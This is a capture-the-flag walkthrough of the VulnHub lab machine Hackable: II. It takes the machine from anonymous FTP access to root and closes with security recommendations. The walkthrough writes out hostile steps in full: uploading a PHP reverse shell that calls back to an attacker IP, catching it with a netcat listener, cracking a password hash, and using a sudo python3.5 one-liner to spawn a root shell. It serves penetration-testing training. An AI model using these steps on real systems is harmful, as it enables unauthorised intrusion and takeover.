# Hackable: II (VulnHub)

## Overview

**Hackable: II** is an Easy-level VulnHub machine created by **Elias Sousa**. This machine focuses on fundamental penetration testing techniques including network enumeration, anonymous FTP exploitation, web directory discovery, remote code execution through insecure file uploads, password hash cracking, SSH access, and Linux privilege escalation via an insecure sudo configuration.

The walkthrough demonstrates how anonymous FTP access combined with a web-accessible upload directory can result in full system compromise. It also highlights the importance of secure file upload handling, strong passwords, and proper sudo configuration.

---

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Hackable: II |
| Author | Elias Sousa |
| Series | Hackable |
| Platform | VulnHub |
| Release Date | 15 June 2021 |
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Attacker Machine | Kali Linux |
| Objective | Obtain User and Root Access |

---

## Skills Demonstrated

- Network Discovery
- Service Enumeration
- Nmap Scanning
- FTP Enumeration
- Anonymous FTP Access
- Web Enumeration
- Directory Bruteforcing
- DIRB
- File Upload Exploitation
- PHP Reverse Shell
- Remote Code Execution
- Shell Stabilization
- Local Enumeration
- Password Hash Discovery
- MD5 Hash Cracking
- Credential Harvesting
- SSH Access
- Linux Enumeration
- Sudo Enumeration
- GTFOBins
- Privilege Escalation
- Root Compromise
- Post Exploitation

---

## Tools Used

- Netdiscover
- Nmap
- FTP
- DIRB
- Netcat
- PHP Reverse Shell (PentestMonkey)
- CrackStation
- SSH
- GTFOBins
- Kali Linux

---

## Attack Methodology

1. Discover the target machine.
2. Enumerate open services.
3. Access the FTP server anonymously.
4. Download and analyze exposed files.
5. Enumerate the web server.
6. Discover the writable upload directory.
7. Upload a PHP reverse shell.
8. Obtain an initial shell.
9. Enumerate the local filesystem.
10. Recover a password hash.
11. Crack the password.
12. Login via SSH.
13. Enumerate sudo privileges.
14. Abuse Python GTFOBins.
15. Obtain root access.
16. Capture the flags.

---

## Network Discovery

Identify the target.

```bash
sudo netdiscover -i eth0
```

Result:

```text
192.168.10.7
```

The target machine was successfully identified.

---

## Service Enumeration

Perform a full TCP scan.

```bash
sudo nmap -sC -sV -p- 192.168.10.7 --min-rate 10000
```

### Open Ports

| Port | Service | Version |
|------|----------|---------|
| 21 | FTP | ProFTPD |
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache 2.4.18 |

### Key Findings

- Anonymous FTP login enabled
- SSH service available
- Apache web server running
- Potential attack surface via FTP

---

## Anonymous FTP Enumeration

Connect to FTP.

```bash
ftp 192.168.10.7
```

Login using:

```text
Username: anonymous
Password: anonymous
```

List files.

```bash
ls -la
```

Discovered file:

```text
CALL.html
```

Download it.

```bash
get CALL.html
```

---

## Analyzing CALL.html

Inspect the downloaded file.

```bash
cat CALL.html
```

Interesting finding:

```html
<title>onion</title>
```

Although no credentials are present, the keyword **onion** becomes useful later during password cracking.

---

## Web Enumeration

Browse the website.

```text
http://192.168.10.7
```

The default Apache page is displayed.

Run DIRB.

```bash
dirb http://192.168.10.7/
```

Interesting directory:

```text
/files/
```

---

## Investigating /files

Visit:

```text
http://192.168.10.7/files/
```

Observations:

- FTP uploads are stored in the web root.
- Uploaded files are web accessible.
- PHP files execute through the browser.

This allows Remote Code Execution through file upload.

---

## Uploading a Reverse Shell

Download the PentestMonkey PHP reverse shell.

Rename it.

```bash
mv php-reverse-shell.php shell.php
```

Configure:

```php
$ip = '192.168.10.13';
$port = 1234;
```

Upload via FTP.

```bash
ftp 192.168.10.7
put shell.php
```

---

## Initial Access

Start a listener.

```bash
nc -lnvp 1234
```

Execute the shell.

```text
http://192.168.10.7/files/shell.php
```

Reverse shell received.

Current user:

```text
www-data
```

---

## Local Enumeration

Explore the home directory.

```bash
cd /home
ls
```

Interesting files:

```text
important.txt
shrek
```

Read the clue.

```bash
cat important.txt
```

Execute the referenced script.

```bash
/.runme.sh
```

Recovered:

```text
shrek:cf4c2232354952690368f1b3dfdfb24d
```

---

## Password Cracking

Crack the discovered MD5 hash.

```text
cf4c2232354952690368f1b3dfdfb24d
```

Using CrackStation.

Recovered password:

```text
onion
```

Credentials:

```text
Username: shrek
Password: onion
```

---

## SSH Access

Login.

```bash
ssh shrek@192.168.10.7
```

Verify.

```bash
id
```

Output:

```text
uid=1000(shrek)
```

---

## User Flag

Navigate to the user's home directory.

```bash
ls
cat user.txt
```

User flag successfully obtained.

---

## Privilege Escalation

Check sudo permissions.

```bash
sudo -l
```

Result:

```text
(root) NOPASSWD: /usr/bin/python3.5
```

Exploit using GTFOBins.

```bash
sudo python3.5 -c 'import os; os.system("/bin/bash")'
```

Verify.

```bash
id
```

Output:

```text
uid=0(root)
```

Root access obtained.

---

## Root Flag

Navigate to the root directory.

```bash
cd /root
ls
cat root.txt
```

Root flag successfully captured.

---

## Vulnerabilities Identified

### 1. Anonymous FTP Access

The FTP server allowed anonymous authentication.

### 2. Writable FTP Directory

Attackers could upload arbitrary files.

### 3. Web-Accessible Upload Directory

Uploaded PHP files executed directly through the web server.

### 4. Credential Disclosure

A password hash was exposed through an accessible script.

### 5. Weak Password

The password was easily cracked using public hash databases.

### 6. Dangerous Sudo Configuration

Python 3.5 could be executed as root without authentication.

---

## Attack Chain Summary

- Target Discovery using Netdiscover
- Service Enumeration with Nmap
- Anonymous FTP Login
- Download CALL.html
- Discover "onion" clue
- Web Enumeration
- Directory Discovery using DIRB
- Discover /files upload directory
- Upload PHP Reverse Shell
- Gain www-data shell
- Local Enumeration
- Recover MD5 Password Hash
- Crack Password
- SSH Login as shrek
- Enumerate Sudo Privileges
- Exploit Python GTFOBins
- Obtain Root Shell
- Capture User and Root Flags

---

## Security Recommendations

- Disable anonymous FTP access.
- Restrict upload permissions.
- Prevent execution of uploaded files.
- Separate upload directories from the web root.
- Store passwords using strong salted hashes.
- Enforce strong password policies.
- Remove unnecessary sudo privileges.
- Follow the principle of least privilege.
- Regularly audit services and configurations.
- Perform periodic security assessments.

---

## Key Learning Outcomes

- Anonymous FTP services can expose critical attack vectors.
- Writable upload directories often lead to Remote Code Execution.
- Web enumeration complements service enumeration.
- Hidden clues may become valuable later during exploitation.
- Password hash cracking remains an important post-exploitation technique.
- SSH provides a stable shell after initial compromise.
- GTFOBins is an excellent privilege escalation resource.
- Misconfigured sudo permissions can directly lead to root compromise.

---

## Conclusion

Hackable: II is an excellent beginner-friendly VulnHub machine that teaches core penetration testing concepts including service enumeration, anonymous FTP exploitation, file upload vulnerabilities, password cracking, SSH access, and Linux privilege escalation through insecure sudo permissions. It provides a practical understanding of how multiple small misconfigurations can be chained together to achieve full system compromise.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
